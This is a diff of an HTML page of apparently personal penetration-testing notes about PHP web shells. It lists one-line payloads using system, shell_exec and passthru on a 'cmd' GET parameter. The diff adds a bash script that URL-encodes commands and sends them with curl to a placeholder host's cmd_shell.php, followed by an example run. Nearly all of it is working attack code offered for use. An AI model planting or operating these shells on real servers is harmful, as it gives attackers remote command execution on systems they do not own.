@@ -13,13 +13,28 @@ website.com/vulnpage?cmd=&lt;exec command&gt;<br/>
 &#09;?&gt; <br/>
 <br/>
 same as: &lt;?php system($_GET['cmd']); ?&gt;<br/>
-Alternate: <span style="font-size: 10pt"><span style="font-family: inherit">&lt;?php</span>&nbsp;<span style="font-family: inherit">echo</span>&nbsp;<span style="font-family: inherit">shell_exec($_GET['cmd'].' 2&gt;&amp;1');</span>&nbsp;<span style="font-family: inherit">?&gt;</span></span>&nbsp; <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;?php passthru($_GET['cmd']); ?&gt; &nbsp;</li>
+Alternate: <span style="font-family: inherit"><span style="font-size: 10pt">&lt;?php</span></span><span style="font-size: 10pt">&nbsp;<span style="font-family: inherit">echo</span>&nbsp;<span style="font-family: inherit">shell_exec($_GET['cmd'].' 2&gt;&amp;1');</span>&nbsp;<span style="font-family: inherit">?&gt;</span></span>&nbsp; <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;?php passthru($_GET['cmd']); ?&gt; &nbsp;</li>
 </ul>
 </li>
 </ul>
 <br/>
 See 'Code Exec Functions' page for other potential commands to use.<br/>
 <br/>
-<span style="font-family: inherit"><span style="font-size: 10pt">preferred: &lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;</span></span><br/>
+<span style="font-size: 10pt"><span style="font-family: inherit">preferred: &lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;</span></span><br/>
 <br/>
-SEC560 has a better shell</body></html>
+SEC560 has a better shell<br/>
+<br/>
+<br/>
+<br/>
+Simple bash script for CLI execution (there are others that are probably a lot better, or make your own)<br/>
+#!/bin/bash<br/>
+URL="http://x.x.x.x:yyyy/cmd_shell.php"<br/>
+CMD=`echo ${*} | sed s'/ /%20/g'`<br/>
+CMD=`echo ${CMD} | sed s'/&amp;/%26/g'`<br/>
+CMD=`echo ${CMD} | sed s'/&gt;/%3e/g'`<br/>
+echo ${URL}?cmd=${CMD}<br/>
+curl -s ${URL}?cmd=${CMD}<br/>
+echo ""<br/>
+<br/>
+and execute it:<br/>
+./cmd_inj ls -la</body></html>
